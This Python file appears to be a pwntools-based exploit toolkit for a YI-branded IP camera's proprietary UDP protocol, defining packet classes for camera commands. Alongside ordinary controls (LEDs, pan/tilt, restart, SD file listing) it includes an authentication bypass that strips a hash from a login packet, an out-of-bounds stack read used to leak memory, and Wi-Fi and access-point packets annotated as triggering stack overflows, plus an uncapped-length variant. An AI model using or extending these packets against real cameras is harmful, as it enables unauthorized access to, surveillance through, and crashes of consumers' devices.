import socket
import time
import struct
import sys
from pwn import *

"""
Header of all YI messages to camera
"""
class YI_HEADER:
    def __init__(self, type, message_length):
        self.type = type
        self.message_length = message_length

    def pack(self):
        return struct.pack('>BBH', 0xf1, self.type, self.message_length)


# This is the secureish variant the app uses with a check on the camera ID which is fetched from {ap_preview}, but this is completely optional
class LAN_SEARCH:
    def __init__(self, message_type, message_length, tnp_uid_front, tnp_uid_middle, tnp_uid_end, integer):
        self.message_type = message_type
        self.message_length = message_length
        self.tnp_uid_front = tnp_uid_front
        self.tnp_uid_middle = tnp_uid_middle
        self.tnp_uid_end = tnp_uid_end
        self.integer = integer

    def pack(self):
        return struct.pack('>BBH8sI8sI', 0xf1, self.message_type, self.message_length, self.tnp_uid_front.encode(), self.tnp_uid_middle, self.tnp_uid_end.encode(), self.integer)

class LAN_SEARCH_SMOL:
    def __init__(self, message_type, message_length):
        self.message_type = message_type
        self.message_length = message_length

    def pack(self):
        return struct.pack('>BBH', 0xf1, self.message_type, self.message_length)

# doesnt work
class MSG_SDEV_RUN:
    def __init__(self, message_length):
        self.message_type = 0x90 # 8a, 82 gives stuff back
        self.message_length = message_length

    def pack(self):
        return struct.pack('>BBH', 0xf1, self.message_type, self.message_length)

# doesnt work
class MSG_SESSION_RESPONSE:
    def __init__(self, message_length):
        self.message_type = 0x6
        self.message_length = message_length

    def pack(self):
        return struct.pack('>BBH', 0xf1, self.message_type, self.message_length)

# sends some stuff back
class MSG_RLY_TCP_TO:
    def __init__(self, message_length):
        self.message_type = 0x8a
        self.message_length = message_length

    def pack(self):
        return struct.pack('>BBH', 0xf1, self.message_type, self.message_length)

# sends some stuff back too
class MSG_RLY_TO:
    def __init__(self, message_length):
        self.message_type = 0x82
        self.message_length = message_length

    def pack(self):
        return struct.pack('>BBH', 0xf1, self.message_type, self.message_length)

# NOT WORKING
class MSG_LAN_NOTIFY_ACK:
    def __init__(self, message_length, message_first_seven, middle_int, message_last_seven):
        self.message_type = 0x32
        self.message_length = message_length
        self.message_first_seven = message_first_seven
        self.middle_int = middle_int
        self.message_last_seven = message_last_seven

    def pack(self):
        return struct.pack('>BBH8sI8s', 0xf1, self.message_type, self.message_length,
            self.message_first_seven, self.middle_int, self.message_last_seven)

# WIP we can hit this but never see the message
class MSG_DEV_LGN_SIGN_ACK:
    def __init__(self, message_length, result, lgnInterval, config):
        self.message_type = 0x15
        self.message_length = message_length
        self.result = result # 0 = success
        self.lgnInterval = lgnInterval # capped at 0x19
        self.config = 2 # cant be 3

    def pack(self):
        return struct.pack('>BBHBBB', 0xf1, self.message_type, self.message_length,
            self.result, self.lgnInterval, self.config)


# This is the secure variant the app uses with some hash at the end, we can just get rid of it and it still lets us in
class PUNCHPKT_EX:
    def __init__(self, message_type, message_length, tnp_uid_front, tnp_uid_middle, tnp_uid_end, integer, timestamp, hash):
        self.message_type = message_type
        self.message_length = message_length
        self.tnp_uid_front = tnp_uid_front
        self.tnp_uid_middle = tnp_uid_middle
        self.tnp_uid_end = tnp_uid_end
        self.integer = integer
        self.timestamp = timestamp
        self.hash = hash

    def pack(self):
        return struct.pack('>BBH8sI8sII16s', 0xf1, self.message_type, self.message_length, self.tnp_uid_front.encode(), self.tnp_uid_middle, self.tnp_uid_end.encode(), self.integer, self.timestamp, self.hash)

# this is an insecure version of the punchpkt packet
class PUNCHPKT:
    def __init__(self, message_type, message_length, tnp_uid_front, tnp_uid_middle, tnp_uid_end):
        self.message_type = message_type
        self.message_length = message_length
        self.tnp_uid_front = tnp_uid_front
        self.tnp_uid_middle = tnp_uid_middle
        self.tnp_uid_end = tnp_uid_end

    def pack(self):
        return struct.pack('>BBH8sI8s', 0xf1, self.message_type, self.message_length, self.tnp_uid_front.encode(), self.tnp_uid_middle, self.tnp_uid_end.encode())


# MSG_NOTICE_TO_EX - WORKING, WILL FAIL IF TIME BAD
class MSG_NOTICE_TO_EX:
    def __init__(self, signature, time1, message_first_seven, middle_int, message_last_seven, message_index, interval, content):
        self.signature = signature
        self.time1 = time1 # needs to be ahead of current time
        self.message_first_seven = message_first_seven
        self.middle_int = middle_int
        self.message_last_seven = message_last_seven
        self.message_index = message_index
        self.interval = interval
        self.content = content

    def pack(self): 
        body = struct.pack('>32s32s8sI8sQHB', self.signature, self.time1, self.message_first_seven, self.middle_int, self.message_last_seven, self.message_index, len(self.content), self.interval) + self.content
        yi_header = YI_HEADER(0x3f, len(body)).pack()
        return yi_header + body


"""
Header of DRW messages to camera
"""
class DRW_HEADER:
    def __init__(self, index, body_length):
        self.channel = 0x0
        self.packet_index = index
        self.version = 0x1030000
        self.body_length = body_length

    def pack(self):
        return struct.pack('>BBHII', 0xd1, self.channel, self.packet_index, self.version, self.body_length)


"""
Base DRW message body for messages without arguments
"""
class DRW_NO_ARGS_BODY_BASE:
    def __init__(self, message_id):
        self.message_id = message_id

    def pack(self):
        return struct.pack('>H', self.message_id)


"""
Base DRW message body for messages with arguments
"""
class DRW_ARGS_BODY_BASE:
    def __init__(self, message_id, auth, offset=0x0):
        self.message_id = message_id
        self.ability_set = 0x0
        self.offset = offset
        self.unknown = 0x0
        self.auth = auth

    def pack(self):
        return struct.pack('>HHHH32s', self.message_id, self.ability_set, self.offset, self.unknown, self.auth.encode())


"""
Turns the white led lights on/off
---------------------------------
Arguments:
- 0/1 : On/off
"""
class IOTYPE_USER_IPCAM_SET_DOUBLE_LIGHT:
    def __init__(self, auth, enable, index=0):
        self.message_type = 0x1380
        self.auth = auth
        self.enable = enable
        self.index = index

    def pack(self):
        body = struct.pack('>I', self.enable)
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body


"""
Moves the camera in specified direction
---------------------------------
Arguments:
- 1/2/3/4 : Direction - down/up/right/left
"""
class IOTYPE_USER_PTZ_DIRECTION_CTRL:
    def __init__(self, auth, direction, index=0):
        self.message_type = 0x4012
        self.auth = auth
        self.direction = direction
        self.index = index

    def pack(self):
        body = struct.pack('>I', self.direction)
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body


"""
Stops current camera movement
"""
class IOTYPE_USER_PTZ_DIRECTION_CTRL_STOP:
    def __init__(self, index=0):
        self.message_type = 0x4013
        self.index = index

    def pack(self):
        body_base = DRW_NO_ARGS_BODY_BASE(self.message_type).pack()
        drw_header = DRW_HEADER(self.index, len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)).pack()
        return yi_header + drw_header + body_base


"""
Restarts camera
"""
class IOTYPE_USER_IPCAM_RESTART_DEVICE:
    def __init__(self, index=0):
        self.message_type = 0x1404
        self.index = index

    def pack(self):
        body_base = DRW_NO_ARGS_BODY_BASE(self.message_type).pack()
        drw_header = DRW_HEADER(self.index, len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)).pack()
        return yi_header + drw_header + body_base

"""
Enables motion detection alarm maybe?
"""
class IOTYPE_USER_IPCAM_SET_ALARM_SOUND:
    def __init__(self, auth, enable, index=0):
        self.message_type = 0x1382
        self.auth = auth
        self.enable = enable
        self.index = index

    def pack(self):
        body = struct.pack('>I', self.enable)
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body

"""
Sets front led illumination time
"""
class IOTYPE_USER_IPCAM_SET_WHITE_LED_TIME:
    def __init__(self, auth, time, index=0):
        self.message_type = 0x1390
        self.auth = auth
        self.time = time
        self.index = index

    def pack(self):
        body = struct.pack('>I', self.time)
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body


"""
Gets front led illumination time
"""
class IOTYPE_USER_IPCAM_GET_WHITE_LED_TIME:
    def __init__(self, index=0):
        self.message_type = 0x1392
        self.index = index

    def pack(self):
        body_base = DRW_NO_ARGS_BODY_BASE(self.message_type).pack()
        drw_header = DRW_HEADER(self.index, len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)).pack()
        return yi_header + drw_header + body_base


"""
Uses the IOTYPE_USER_IPCAM_SET_WHITE_LED_TIME with specified 
offset in DRW_HEADER to set value to value from stack,
can then use IOTYPE_USER_IPCAM_GET_WHITE_LED_TIME to leak 
the value
"""
class OOB_READ_SET_PACKET:
    def __init__(self, auth, offset, index=0):
        self.message_type = 0x1390
        self.auth = auth
        self.index = index
        self.offset = offset

    def pack(self):
        body = struct.pack('>I', 0x0)
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth, self.offset).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body


"""
This can be used to set the wifi info (connect to hotspot), has 
stack overflow in the handler
"""
class IOTYPE_USER_IPCAM_SET_WIFI_INFO:
    def __init__(self, auth, is_on, ssid, password, bindkey, index=0):
        self.message_type = 0x1400
        self.auth = auth
        self.is_on = is_on
        self.ssid = ssid
        self.password = password
        self.bindkey = bindkey
        self.index = index

    def pack(self):
        body = struct.pack('>B', self.is_on)

        # append ssid
        if (type(self.ssid) == str):
            body += self.ssid.encode()
        else:
            body += self.ssid
        body += b'\n'

        # append password
        if (type(self.password) == str):
            body += self.password.encode()
        else:
            body += self.password
        body += b'\n'

        # append bindkey
        if (type(self.bindkey) == str):
            body += self.bindkey.encode()
        else:
            body += self.bindkey
        
        # build packet
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body


"""
This can be used to set the AP credentials, again, has a 
stack overflow in the handler
"""
class IOTYPE_USER_IPCAM_SET_AP_MODE_REQ:
    def __init__(self, auth, is_on, ssid, password, index=0):
        self.message_type = 0x5c00
        self.auth = auth
        self.is_on = is_on
        self.ssid = ssid
        self.password = password
        self.index = index

    def pack(self):
        ssid = self.ssid
        if (type(self.ssid) == str):
            ssid = self.ssid.encode()

        password = self.password
        if (type(self.password) == str):
            password = self.password.encode()

        body = struct.pack('>B32s', self.is_on, ssid) + password
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body


"""
Gets device hardware config string
"""
class IOTYPE_USER_IPCAM_GET_DEVICE_PARAM_REQ:
    def __init__(self, index=0):
        self.message_type = 0x6003
        self.index = index

    def pack(self):
        body_base = DRW_NO_ARGS_BODY_BASE(self.message_type).pack()
        drw_header = DRW_HEADER(self.index, len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)).pack()
        return yi_header + drw_header + body_base


class IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ:
    def __init__(self, auth, hw_conf_string, index=0):
        self.message_type = 0x6001
        self.auth = auth
        self.hw_conf_string = hw_conf_string
        self.index = index

    def pack(self):
        body = struct.pack('>128s', self.hw_conf_string)
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body

class UNCAPPED_IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ:
    def __init__(self, auth, hw_conf_string, index=0):
        self.message_type = 0x6001
        self.auth = auth
        self.hw_conf_string = hw_conf_string
        self.index = index

    def pack(self):
        body = self.hw_conf_string
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body

"""
Gets device information
"""
class IOTYPE_USER_IPCAM_DEVINFO_REQ:
    def __init__(self, index=0):
        self.message_type = 0x330
        self.index = index

    def pack(self):
        body_base = DRW_NO_ARGS_BODY_BASE(self.message_type).pack()
        drw_header = DRW_HEADER(self.index, len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)).pack()
        return yi_header + drw_header + body_base

"""
horizontal range is 800 (right) to -800 (left) (max 400 each way)
vertical range is 100 to -100 (max 50 each way)
"""
class IOTYPE_USER_PTZ_JUMP_TO_POINT:
    def __init__(self, auth, horizontal, vertical, index=0):
        self.message_type = 0x4015
        self.auth = auth
        self.horizontal = horizontal
        self.vertical = vertical
        self.index = index

    def pack(self):
        body = struct.pack('>ii', self.horizontal + 50, self.vertical + 50)
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body

"""
Fetches version information from the camera
"""
class IOTYPE_USER_IPCAM_GET_VERSION:
    def __init__(self, index=0):
        self.message_type = 0x1300
        self.index = index

    def pack(self):
        body_base = DRW_NO_ARGS_BODY_BASE(self.message_type).pack()
        drw_header = DRW_HEADER(self.index, len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)).pack()
        return yi_header + drw_header + body_base

"""
"""
class IOTYPE_USER_IPCAM_SET_RESOLUTION:
    def __init__(self, auth, p1, p2, index=0):
        self.message_type = 0x1311
        self.auth = auth
        self.p1 = p1
        self.p2 = p2
        self.index = index

    def pack(self):
        body = struct.pack('>ii', self.p1, self.p2)
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body

"""
"""
class IOTYPE_USER_TNP_IPCAM_START_KEY:
    def __init__(self, auth, p1, p2, p3, index=0):
        self.message_type = 0x2345
        self.auth = auth
        self.p1 = p1
        self.p2 = p2
        self.p3 = p3
        self.index = index

    def pack(self):
        body = struct.pack('>BBBB', self.p1, self.p2, self.p3, 0)
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body


"""
This can be used to set the AP credentials, again, has a 
stack overflow in the handler
"""
class IOTYPE_USER_IPCAM_SET_AP_MODE_REQ_PHAT_OFFSET:
    def __init__(self, auth, is_on, ssid, password, offset_bytes, index=0):
        self.message_type = 0x5c00
        self.auth = ''
        self.is_on = is_on
        self.ssid = ssid
        self.password = password
        self.index = index
        self.offset_bytes = offset_bytes

    def pack(self):
        ssid = self.ssid
        if (type(self.ssid) == str):
            ssid = self.ssid.encode()

        password = self.password
        if (type(self.password) == str):
            password = self.password.encode()

        body = self.offset_bytes + struct.pack('>B32s', self.is_on, ssid) + password
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth, len(self.offset_bytes)).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base) + len(body)).pack()
        return yi_header + drw_header + body_base + body

"""
Fetches alarm list stuff
"""
class IOTYPE_USER_IPCAM_GET_ALARM_EVENT_LIST_REQ:
    def __init__(self, auth, start_time, end_time, index=0):
        self.message_type = 0x5c06
        self.auth = auth
        self.start_time = start_time
        self.end_time = end_time
        self.index = index

    def pack(self):
        body = struct.pack('>iii', 0, self.start_time, self.end_time)
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body


"""
Fetches ds index thing
"""
class IOTYPE_USER_IPCAM_GET_SD_INDEX:
    def __init__(self, auth, start_time, end_time, index=0):
        self.message_type = 0x1410
        self.auth = auth
        self.start_time = start_time
        self.end_time = end_time
        self.index = index

    def pack(self):
        body = struct.pack('>iii', 0, self.start_time, self.end_time)
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body

"""
Fetches sd file thing
"""
class IOTYPE_USER_IPCAM_GET_SD_FILE:
    def __init__(self, auth, start_time, end_time, index=0):
        self.message_type = 0x1412
        self.auth = auth
        self.type = 0
        self.start_time = start_time
        self.end_time = end_time
        self.index = index

    def pack(self):
        body = struct.pack('>iii', self.type, self.start_time, self.end_time)
        body_base = DRW_ARGS_BODY_BASE(self.message_type, self.auth).pack()
        drw_header = DRW_HEADER(self.index, len(body) + len(body_base)).pack()
        yi_header = YI_HEADER(0xd0, len(drw_header) + len(body_base)+ len(body)).pack()
        return yi_header + drw_header + body_base + body